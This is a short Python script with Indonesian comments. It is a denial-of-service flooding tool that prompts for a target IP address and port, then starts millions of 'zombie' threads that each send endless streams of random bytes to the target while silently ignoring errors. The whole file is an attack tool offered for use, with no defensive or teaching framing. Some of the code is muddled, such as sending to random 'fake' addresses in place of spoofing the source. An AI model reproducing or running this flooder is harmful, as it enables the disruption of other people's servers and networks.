import socket
import random
import threading

class Zombie(threading.Thread):
    def __init__(self, target_ip, target_port):
        threading.Thread.__init__(self)
        self.target_ip = target_ip
        self.target_port = target_port

    def run(self):
        while True:
            try:
                fake_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
                fake_port = random.randint(1, 65535)
                payload_size = random.randint(10000, 1000000)
                payload = random._urandom(payload_size)

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(0)  # Menghindari penundaan saat mengirim
                s.connect_ex((self.target_ip, self.target_port))

                while True:
                    s.send(payload)
                    s.sendto(payload, (fake_ip, fake_port))

                s.close()
            except socket.error as e:
                pass  # Mengabaikan kesalahan tanpa menampilkannya

target_ip = input("Masukkan alamat IP target: ")
target_port = int(input("Masukkan port target: "))

jumlah_zombie = 10000000

zombies = []
for _ in range(jumlah_zombie):
    zombie = Zombie(target_ip, target_port)
    zombies.append(zombie)
    zombie.start()

for zombie in zombies:
    zombie.join()
